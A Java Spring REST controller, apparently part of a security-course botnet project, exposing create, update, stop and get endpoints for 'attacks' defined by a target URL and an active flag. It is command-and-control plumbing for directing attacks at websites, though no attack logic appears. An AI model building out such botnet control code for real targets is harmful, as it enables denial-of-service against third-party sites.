package com.seguridad.botnet.controller;

import com.seguridad.botnet.controller.dto.AttackDTO;
import com.seguridad.botnet.model.Attack;
import com.seguridad.botnet.service.AttackService;
import lombok.AllArgsConstructor;
import org.springframework.web.bind.annotation.*;

@RestController
@AllArgsConstructor
public class AttackController {

    private final AttackService attackService;

    @CrossOrigin("*")
    @PostMapping("/create")
    public Attack createAttack(@RequestBody AttackDTO attackDTO) {
        return attackService.createAttack(attackDTO.getUrl(), attackDTO.isActive());
    }

    @CrossOrigin("*")
    @PutMapping("/update/{id}")
    public boolean updateAttack(@RequestBody AttackDTO attackDTO,@PathVariable int id ) {
        return attackService.updateAttack(id, attackDTO.getUrl(), attackDTO.isActive());
    }

    @CrossOrigin("*")
    @PutMapping("/stop/{id}")
    public boolean stopAttack(@PathVariable int id) {
        return attackService.stopAttack(id);
    }

    @CrossOrigin("*")
    @GetMapping("/get/{id}")
    public Attack getAttack(@PathVariable int id) {
        return attackService.getAttack(id);
    }

}
